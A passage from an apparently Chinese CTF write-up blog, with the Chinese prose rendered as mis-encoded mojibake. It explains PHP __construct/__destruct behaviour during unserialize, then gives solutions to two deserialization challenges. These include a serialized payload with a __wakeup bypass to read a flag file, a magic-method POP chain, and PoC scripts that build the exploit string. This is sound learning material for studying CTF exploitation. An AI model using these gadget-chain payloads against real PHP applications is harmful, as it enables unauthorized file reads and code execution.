<p>æˆ‘è¿˜æœ‰ä¸ªç–‘é—®ï¼Œå°±æ˜¯<code>__construct()ï¼Œ__destruct()</code>è¿™ä¸¤ä¸ªå‡½æ•°ä»€ä¹ˆæƒ…å†µä¸‹è¢«è§¦å‘ï¼Ÿä»¥å‰éƒ½æ˜¯çœ‹çš„æ¯”è¾ƒä¸“ä¸šçš„è¯­è¨€è¯´æ˜çš„ï¼Œä¹Ÿæ²¡çœ‹å¤ªæ‡‚ã€‚</p>
<p>é€šè¿‡ä¸‹é¢ä¾‹å­å¯ä»¥æ›´æ˜ç™½ä¸¤ä¸ªå‡½æ•°è¢«è§¦å‘çš„æƒ…å†µï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;000\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;111\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;222\n&quot;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$class</span>);</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()!!!000</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">__destruct()!!!__destruct()!!!</span><br></pre></td></tr></table></figure>

<p>å»æ‰unset()å‡½æ•°ï¼Œå†è¯•ä¸‹æ²¡æœ‰è¯¥å‡½æ•°ï¼Œä¼šä¸ä¼šè§¦å‘<code>__destruct()</code>å‡½æ•°ï¼Ÿ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;000\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;111\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;222\n&quot;</span>;</span><br><span class="line"><span class="comment">//unset($class);</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœï¼Œè¿˜æ˜¯ä¸€æ ·çš„ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()!!!000</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">__destruct()!!!__destruct()!!!</span><br></pre></td></tr></table></figure>



<p>ï¼ˆ1ï¼‰<strong>è¯´æ˜<code>__construct()</code>ä¼šåœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™(<code>$class = new TestClass();</code>)è¢«è§¦å‘ï¼Œä½†æ˜¯ååºåˆ—åŒ–æ—¶<code>$b = unserialize($a);</code>ï¼Œä¸ä¼šè¢«è§¦å‘ã€‚</strong></p>
<p>ä¸ºä»€ä¹ˆååºåˆ—åŒ–è¿”å›äº†ä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯ä¸ä¼šè§¦å‘<code>__construct()</code>å‘¢ï¼Ÿä¸‹é¢æ˜¯æˆ‘çš„ä¸€äº›ç†è§£ï¼Œæœ‰ä¸æ­£ç¡®çš„åœ°æ–¹è¯·å„ä½å¤§ä½¬æ‰¹è¯„æŒ‡æ­£ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è™½ç„¶æœ‰å¯¹è±¡è¢«åˆ›å»ºï¼Œä½†æ˜¯å› ä¸ºunserializeå‡½æ•°ä¸ä¸€å®šè¿”å›çš„æ˜¯å¯¹è±¡ï¼Œå¯è¿”å› integerã€floatã€stringã€array æˆ– objectã€‚</span><br><span class="line">å¦‚æœååºåˆ—åŒ–è¿”å›çš„ä¸æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆ__construct()å°±ä¸ä¼šè¢«è§¦å‘ï¼Œ è€Œintegerã€floatã€stringã€arrayè¿™äº›æ•°æ®ç±»å‹åº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚</span><br><span class="line">æ‰€ä»¥ååºåˆ—åŒ–è¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¹Ÿä¸ä¼šè§¦å‘__construct()ã€‚</span><br><span class="line">å› æ­¤å¯ä»¥ç†è§£ä¸ºä»€ä¹ˆååºåˆ—åŒ–å¯¹è±¡å­—ç¬¦ä¸ºå¯¹è±¡çš„æ—¶å€™ï¼Œè™½ç„¶æœ‰å¯¹è±¡è¢«åˆ›å»ºï¼Œç”šè‡³å¯ä»¥è°ƒç”¨è¿”å›å¯¹è±¡ä¸­çš„å‡½æ•°ï¼Œä½†æ˜¯å¹¶ä¸ä¼šè§¦å‘__construct()å‡½æ•°</span><br></pre></td></tr></table></figure>



<p>ï¼ˆ2ï¼‰<strong>è¯´æ˜<code>__destruct()</code>ä¼šåœ¨ä»£ç æ‰§è¡Œå®Œæˆåè¢«è§¦å‘ä¸€æ¬¡ï¼Œå› ä¸ºåœ¨phpä¸­ï¼Œç¨‹åºåœ¨è¿è¡Œç»“æŸåï¼Œä¼šè‡ªåŠ¨çš„é”€æ¯å¯¹è±¡ï¼è¿™æ—¶ä¼šè§¦å‘destruct()å‡½æ•°ã€‚ååºåˆ—åŒ–å®Œæˆæ—¶ä¼šè§¦å‘ä¸€æ¬¡(æˆ‘ç†è§£çš„æ˜¯é”€æ¯å¯¹è±¡)ï¼Œæ‰€ä»¥æ‰è¾“å‡ºä¸¤ä¸ª<code>__destruct()!!!</code>ã€‚</strong></p>
<p>ååºåˆ—åŒ–å®Œæˆæ—¶ä¼šè§¦å‘<code>__destruct()</code>å‡½æ•°ä¸€æ¬¡(æˆ‘ç†è§£çš„æ˜¯é”€æ¯å¯¹è±¡)ï¼Œè¿™ä¸ªæ€ä¹ˆç†è§£å‘¢ï¼Œç›´æ¥ä¸Šä»£ç è¯´æ˜ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="comment">//$b = unserialize($a);</span></span><br><span class="line"><span class="comment">//æ²¡æœ‰ååºåˆ—åŒ–çš„æƒ…å†µä¸‹ï¼Œè¾“å‡º__destruct()!!!</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//æœ‰ååºåˆ—çš„æƒ…å†µä¸‹ï¼Œè¾“å‡º__destruct()!!!__destruct()!!!</span></span><br></pre></td></tr></table></figure>



<hr>
<hr>
<p>æœ€åæ€»çš„æ¥æ¢³ç†ä¸€ä¸‹é¢˜ç›®ååºåˆ—åŒ–æ—¶çš„è¿‡ç¨‹ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1ï¼Œè¿è¡Œpocï¼Œè¾“å…¥åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²  O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:37:&quot;D:\æ¡Œé¢\å·¥å…·\php\teacher.php&quot;;&#125;</span><br><span class="line">ä¿®æ”¹fllllllag.phpæ–‡ä»¶è·¯å¾„ä¸º  /var/www/html/fllllllag.php ï¼Œå¹¶ä¿®æ”¹ç›¸åº”å­—ç¬¦é•¿åº¦å€¼ä¸º27ã€‚</span><br><span class="line">æäº¤åï¼Œåœ¨æ‰§è¡Œunserialize()å‡½æ•°ä¹‹å‰ï¼Œå…ˆæ£€æŸ¥ç±»é‡Œæ˜¯å¦æœ‰__wakeup()å‡½æ•°ï¼Œæœ¬é¢˜ä¸­æœ‰ï¼Œå°±ä¼šå…ˆæ‰§è¡Œè¯¥å‡½æ•°ï¼Œ</span><br><span class="line">ç„¶åä¼šæŠŠ$xçš„å€¼èµ‹å€¼ä¸ºå½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯fllllllag.phpæ–‡ä»¶ï¼Œäºæ˜¯éœ€è¦ç»•è¿‡__wakeup()å‡½æ•°ã€‚</span><br><span class="line"></span><br><span class="line">2ï¼Œå¼€å§‹æ‰§è¡Œunserialize()å‡½æ•°ï¼Œç”±äºé¶æœºæºç ä¸­æ²¡æœ‰$class = new TestClass()è¿™æ ·çš„åˆ›å»ºå®ä½“å¯¹è±¡ä»£ç ï¼Œæ‰€ä»¥è¿™æ—¶ä¸ä¼šè§¦å‘__construct()å‡½æ•°ï¼ˆä¸ç†è§£çš„è¯ï¼Œå¯ä»¥çœ‹æ–‡ç« å‰é¢çš„åˆ†æï¼‰</span><br><span class="line"></span><br><span class="line">3ï¼Œååºåˆ—åŒ–åï¼Œå°†ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å˜é‡$xçš„å€¼ /var/www/html/fllllllag.php èµ‹å€¼ç»™Xç±»ä¸­çš„$xï¼Œ</span><br><span class="line"></span><br><span class="line">4ï¼Œç¨‹åºæ‰§è¡Œå®Œæ¯•ï¼Œè§¦å‘ __destruct()å‡½æ•°ï¼Œå¹¶æ˜¾ç¤ºè·¯å¾„ä¸º$xçš„æ–‡ä»¶å†…å®¹ã€‚</span><br></pre></td></tr></table></figure>

<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“<strong>END</strong>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" data-id="cl9hxo4hl001420v4h2vj4vfn" data-title="ç”±NSSCTF-SWPUCTF-ez_ez_unserializeï¼Œå¼•å‘å¯¹ååºåˆ—å…·ä½“è¯¦ç»†è¿‡ç¨‹ä»¥åŠå¯¹__constructï¼Œ__destructå‡½æ•°æ‰§è¡Œæƒ…å†µæ·±åº¦åˆ†æ" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSWSTAR-week2-UnserializeOne" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/" class="article-date">
  <time class="dt-published" datetime="2022-10-19T10:59:22.000Z" itemprop="datePublished">2022-10-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/19/NSWSTAR-week2-UnserializeOne/">NSWSTAR-week2-UnserializeOne</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>å†™è¿™ä¸ªååºåˆ—åŒ–é¢˜ç›®ï¼Œå­¦åˆ°äº†å‡ ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1ï¼Œ__clone()é­”æ³•å‡½æ•°çš„è§¦å‘æ–¹æ³•ä»¥åŠä¸€äº›ç»†èŠ‚</span><br><span class="line">2ï¼Œååºåˆ—åŒ–ä¸­å±æ€§çš„ç§æœ‰ä»¥åŠä¿æŠ¤çš„å¤„ç†æ–¹æ³•</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥çœ‹é¢˜ç›®ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸€æ³¢ï¼Œç¡®å®šäº†åŸºæœ¬popé“¾ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start:__destruct==&gt;Sec::__toString==&gt;Easy::__call==&gt;eeee::__clone==&gt;Start::__isset==&gt;Sec::__invoke</span><br></pre></td></tr></table></figure>

<p>æ›´è¯¦ç»†çš„popé“¾ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Start::__destruct()@$this-&gt;name=$sec   -&gt;   $Sec::__toString()@$this-&gt;obj=$easy   -&gt;   $Easy::__call()@$this-&gt;cla=$copy_eee&amp;$var[0]=$eee   -&gt;   $eee::__clone()@($this-&gt;obj)=($start)   -&gt;   $Start::__isset()@$this-&gt;func=$sec   -&gt;   sec::__invoke()</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ç¼–å†™pocï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$ee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$ee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="variable">$easy</span>-&gt;cla=<span class="variable">$copy_ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>[<span class="number">0</span>]=<span class="variable">$ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>)));</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼Œå‘ç°phpæŠ¥é”™ï¼Œ</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/0.png"></p>
<p>ç„¶åæäº†å¥½ä¹…ä¹Ÿæ²¡æ‰¾åˆ°è§£å†³æ–¹æ³•ï¼Œåˆæ£€æŸ¥äº†å¥½å‡ épopé“¾ï¼Œæ„Ÿè§‰popé“¾æ²¡é”™ï¼Œä¸€æ—¶é—´ä¸çŸ¥é“æ€ä¹ˆåšäº†ã€‚</p>
<p>ç›´åˆ°writeupå‡ºæ¥ğŸ˜¶ğŸ˜¶â€¦â€¦</p>
<p>æœ€åçœ‹äº†ä¸€ä¸‹writeupï¼Œå‘ç°æ„é€ çš„popé“¾æ˜¯æ­£ç¡®çš„ï¼Œåªæ˜¯æ„é€ è¿‡ç¨‹ä¸­å‡ ä¸ªç»†èŠ‚æ²¡æœ‰å¤„ç†å¥½ï¼Œå¯¼è‡´phpå‡ºé”™ã€‚</p>
<p>é‡æ–°ç¼–å†™çš„pocï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$func</span>;<span class="comment">//protectedå˜ä¸ºpublicï¼Œå…·ä½“ä¸ºä»€ä¹ˆè¿™æ ·ä¿®æ”¹ï¼Œç°åœ¨è¿˜ä¸å¤ªæ¸…æ¥š</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$obj</span>;<span class="comment">// privateå˜ä¸ºpublic</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$var</span>;<span class="comment">// privateå˜ä¸ºpublic</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span 